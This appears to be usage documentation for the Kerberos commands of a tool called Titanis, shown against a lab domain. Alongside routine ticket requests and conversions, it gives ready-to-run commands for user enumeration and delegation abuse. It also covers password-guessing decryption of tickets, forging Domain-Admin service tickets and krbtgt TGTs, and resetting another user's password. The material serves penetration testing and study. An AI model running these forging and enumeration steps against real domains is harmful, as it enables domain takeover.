Most Kerberos commands accept ticket files in a few different ways:

1. `-Tgt` - the file containing a ticket-granting ticket
1. `-Ticket` - the file containing the ticket to act on (e.g. the ticket to renew)
1. `-OutputFileName` - the file to receive resulting tickets (e.g. asreq or tgsreq)
1. `-TicketCache` - ticket cache for both TGTs and service tickets

Titanis searches the files specified by `-Tgt` or `-Ticket`, if they are specified.  This files will never be written to.  If not specified, Titanis searches the file specified by `-TicketCache`.

Any new tickets are written to `-OutputFileName`, if specified; otherwise, to `-TicketCache`.  In either case, if the file already exists, Titanis detects and retains the original file format, regardless of the file name extension.

# Get AS info for a user

* Get the supported encryption types
* Get the salt values for each supported encryption type
* Determine whether a user exists
* Determine whether a user requires preauthentication

```
Kerb getasinfo milchick@LUMON LUMON-DC1
```

## Output
```

 INFO: KDC time: 2026-07-30T13:36:50.7476690
EType                 Salt (text)             Salt (hex)
--------------------  ----------------------  --------------------------------------------
Aes256CtsHmacSha1_96  CORP.LUMON.INDmilchick  434f52502e4c554d4f4e2e494e446d696c636869636b
Aes128CtsHmacSha1_96  CORP.LUMON.INDmilchick  434f52502e4c554d4f4e2e494e446d696c636869636b
             Rc4Hmac
```

* This only works if the user account requires preauthentication.  If the account does not require preauthentication, the server replies with a ticket instead of preauthentication types.

# Compute Keys from a Password and Salt
```
Kerb s2k -Password 'Br3@kr00m!' -Salt LUMON.INDmilchick
```

# Request a TGT with Password

```
Kerb asreq milchick@LUMON LUMON-DC1 -Password 'Br3@kr00m!' -TicketCache milchick.ccache
```

## Concise Form
```
TITANIS_DEFAULT_USERNAME=milchick@LUMON
TITANIS_DEFAULT_KDC=LUMON-DC1
TITANIS_DEFAULT_PASSWORD=Br3@kr00m!
KRB5CCNAME=~/milchick.ccache
```

```
Kerb asreq
```

# Request a TGT with PKINIT

## With PFX
```
Kerb asreq milchick@LUMON LUMON-DC1 -UserCert milchick.pfx -UserKeyPassword password -TicketCache milchick.ccache
```

## With PEM including certificate and key
```
Kerb asreq milchick@LUMON LUMON-DC1 -UserCert milchick.pem -UserKeyPassword password -TicketCache milchick.ccache
```

## With separate certificate and key
```
Kerb asreq milchick@LUMON LUMON-DC1 -UserCert milchick-cert.pem -UserKey milchick.key -UserKeyPassword password -TicketCache milchick.ccache
```

# Request Initial Service Ticket
An _initial service ticket_ is one granted by the AS exchange, with user credentials, to a service.  Use any of the credential specifications as for a TGT, but include the `-Target` with one or more targets

```
Kerb asreq milchick@LUMON LUMON-DC1 -Password 'Br3@kr00m!' -Target host/LUMON-FS1, LUMON-FS1$, kadmin/changepw -TicketCache milchick.ccache
```

The returned tickets will be service tickets (not TGTs) with the Initial option set, proving knowledge or possession of user credentials.

# Request a Service Ticket

To request a service ticket, you must first have a TGT, either in the ticket cache or in a separate ticket file specified with `-Tgt`

## Using ticket cache
```
Kerb tgsreq LUMON-DC1 -Target host/LUMON-FS1, LUMON-FS1$ -TicketCache milchick.ccache
```

## Using separate ticket files
```
Kerb tgsreq LUMON-DC1 -Tgt milchick-tgt.ccache -Target host/LUMON-FS1, LUMON-FS1$ -OutputFileName milchick-st.ccache
```

If the file specified by `-OutputFileName` exists, specify either `-Overwrite` to overwrite it, or `-Append` to append the new ticket to it.

# Request an Inter-realm Ticket
To request an inter-realm ticket, request a ticket to your home KDC for the host in a different realm using its FQDN, or use a 3-part SPN.

Titanis handles the request the same as a request for a ticket in the same realm.  If the principal indicates a name in a different realm, the KDC replies with a TGT for the remote realm.  Titanis interprets this as a referral, and sends another request to the remote realm.  This may result in multiple referrals to walk multiple transitive domain trusts.  Titanis handles any number of referrals, but will stop if it detects a loop.  Titanis adds each referral TGT to the ticket cache.

## With the FQDN
```
Kerb tgsreq LUMON-DC1 -Target cifs/B5X-DC1.branch5x.lumon.ind -TicketCache milchick.ccache
```

## With a 3-Part SPN
```
Kerb tgsreq LUMON-DC1 -Target cifs/B5X-DC1/branch5x -TicketCache milchick.ccache
```


# Request Armored Tickets
To request an armored ticket, you must first obtain a TGT for the account to armor the ticket with.  Once you have this ticket, specify it with `-ArmorTicket` when requesting a ticket.

## For an armored TGT
```
Kerb asreq milchick@LUMON LUMON-DC1 -Password 'Br3@kr00m!' -ArmorTicket allentown.ccache -TicketCache milchick-armored-tgt.ccache
```

## For an armored service ticket
```
Kerb tgsreq LUMON-DC1 -Tgt milchick-armored-tgt.ccache -ArmorTicket allentown.ccache -Target host/LUMON-FS1, cifs/LUMON-FS1 -OutputFileName milchick-armored-st.ccache
```

# Request a U2U Ticket
To request a U2U ticket, you must first obtain:

* A TGT for your user account
* A TGT for the target account, to be specified with `-U2uTicket`

```
Kerb tgsreq -Tgt milchick-tgt.ccache  -U2uTicket allentown.ccache -Target allentown -OutputFileName milchick-u2u-allentown.ccache
```

The `-Target` name must be the user name of the `-U2uTicket`.

This may be combined with `-ArmorTicket` to obtain an armored U2U ticket.

# Request a S4U-to-self ticket

To request a S4U-to-self ticket, you must first obtain a TGT for the service account.  The `-Target` must match the service account.

```
Kerb tgsreq -Tgt allentown.ccache -Target allentown$ -S4UserName milchick
```

# Request a S4U-to-self ticket

To request a S4U-to-self ticket, you must first obtain a TGT for the service account.  The `-Target` must match the service account, either as the user name or SPN mapped to it.

```
Kerb tgsreq -Tgt allentown.ccache -Target host/allentown -S4UserName milchick
```

## Using a Certificate

```
Kerb tgsreq -Tgt allentown.ccache -Target host/allentown -S4UserCert milchick.cer
```

# Request a S4U-to-proxy ticket

To request a S4U-to-proxy ticket, you must first obtain a TGT for the service account.  The `-S4ProxyService` must match the service account, either as the user name or SPN mapped to it.  The `-Target` specifies the target of the resulting ticket.

```
Kerb tgsreq -Tgt allentown.ccache -S4ProxyService host/allentown -S4UserName milchick -Target host/lumon-dc1
```

## Using a Certificate

```
Kerb tgsreq -Tgt allentown.ccache -S4ProxyService host/allentown -S4UserCert milchick.cer -Target host/lumon-dc1
```


Titanis first requests a TGT for the user using S4U-to-self, then requests the proxy ticket.

# Renew a Ticket
```
Kerb renew LUMON-DC1 -Ticket milchick-tgt.ccache -OutputFileName milchick-renewed.ccache
```

# Print Authorization Data
To print the authorization data in a ticket, you must know the key to decrypt the ticket.

## With a Key
```
Kerb select -From milchick-forged.ccache -TicketKey ce9933926f22827eb38edd0351d0afab -PrintAuthData
```

## With Password and Salt Guessing

Specify one or more passwords, along with one or more salts.  Titanis will try every combination with every ticket, and print the authorization data for successfully decrypted tickets.

```
Kerb select -From milchick-forged.ccache -ServicePassword guess1, guess2, guess3, -ServiceSalt CORP.LUMON.INDhostlumon-fs1.corp.lumon.ind -PrintAuthData
```

## Save the Decryption Key

If you want to save the decrypted ticket, specify the target file with `-Into`.  If decryption is successful, Titanis saves the encryption key in the ticket file.

```
Kerb select -From milchick-forged.ccache -TicketKey ce9933926f22827eb38edd0351d0afab -PrintAuthData -Into milchick-decrypted.ccache
```

## Previously-Decrypted Ticket
If a ticket was previously decrypted, specify `-PrintAuthData` without providing a key.
```
Kerb select -From milchick-decrypted.ccache -PrintAuthData
```

# Forge a Ticket
```
Kerb forge LUMON-DC1 -TicketEType Aes256CtsHmacSha1_96
```

To forge a ticket, you must have the kef of the target account.  For a TGT, this is the key associated with the `krbtgt` account.  For a service ticket, this is the key associated with the service account (user or computer).  You may forge multiple tickets by specifying multiple targets

## Service Ticket
```
Kerb forge -TicketEType Aes128CtsHmacSha1_96 -ServerKey ce9933926f22827eb38edd0351d0afab -Target LUMON-FS1$, host/lumon-fs1, cifs/lumon-fs1 -UserSid S-1-5-21-17
18252288-3416168337-1457700507-1104 -OutputFileName milchick-forged.ccache -Overwrite
```

By default, Titanis builds a ticket with a PAC resembling a domain administrator with RIDs *512* (Domain Admins) and *513* (Domain Users).  Additionally, it includes the extra SID `S-1-18-1` (Authentication Authority asserted identity).

## TGT
For a TGT, specify the target as **krbtgt/**<*realm*>.  For `-ServerKey`, use the key associated with the **krbtgt** account.
```
Kerb forge -TicketEType Aes256CtsHmacSha1_96 -ServerKey 1ef8d7fec03386094b174e0b8c0853e34e09cb15fda9c3fa4046434675189262 -Target krbtgt/CORP.LUMON.IND -UserSid S-1-5-21-1718252288-3416168337-1457700507-1104 -OutputFileName milchick-tgt-forged.ccache -Overwrite
```


## With Additional Groups
To specify additional groups:

* For domain groups, specify the RIDs with `-DomainRids`.  If you specify one or more RIDs, Titanis does not add 512 and 513 automatically; you must specify them in the list.
* For groups in the resource domain, specify the SID of the resource domain with `-ResourceDomainSid` and the groups with `-ResourceGroupRids`.
* For any other group, specify the group SIDs with `-ExtraSids`.

Titanis offers other parameters that let you customize other PAC fields.  Consult the documentation for [Kerb forge](../../tools/Kerb.md#kerb-forge) for a full list.

# View Ticket Cache
```
Kerb select
```

With no arguments, this command displays the tickets in `$KRB5CCNAME`  To display tickets from specific files:

```
Kerb select -From file1.ccache, file2.kirbi, file3
```

Each file may be either .kirbi or .ccache, independent of other files.

# Combine Ticket Files
```
Kerb select -From file1.ccache, file2.kirbi, file3 -Into combined.ccache
```

# Split Ticket Files

To split a file containing multiple tickets into separate files, use `Kerb select` with one or more filters.

|Parameter|Description|
|-|-|
|**-Current**|Tickets currently valid|
|**-InvertMatch**|Tickets that don't match the filter criteria|
|**-MatchingClientName** <*client-name*>|Tickets matching *client-name*|
|**-MatchingSpn** <*spn*>|Tickets matching *spn*|
|**-SeqNbr** <*seq*>|Tickets in a specific position within the file|

Consult the documentation for [Kerb select](../../tools/Kerb.md#kerb-select) for a full list of filters and other options.

```
Kerb select -From combined.ccache, file2.kirbi, file3 -TargetSpn host/lumon-fs1 -Into lumon-fs1.ccache
```

# Clear Ticket Cache

To clear the ticket cache, simply delete the ticket cache file.  Since the ticket cache is (should be) indicated by `$KRB5CCNAME`:

```
rm $KRB5CCNAME
```

# Convert a Ticket File

## From .ccache to .kirbi
```
Kerb select -From milchick-tgt.ccache -Into milchick-tgt.kirbi
```


## From .kirbi to .ccache
```
Kerb select -From milchick-tgt.kirbi -Into milchick-tgt.ccache
```

# Change a Password
To change a password for your own user account, you must have either a ticket for *kadmin/changepw* or the user credentials to acquire one.

```
Kerb changepw -NewPassword 'Br3@kr00m!12345'
```

Password changes are subject to domain password policies, such as password history.

# Reset a Password
To reset a password for another user account:

```
Kerb setpw -NewPassword 'Br3@kr00m!' -TargetAccount milchick
```

Passwords reset in this manner are generally not subject to password policies.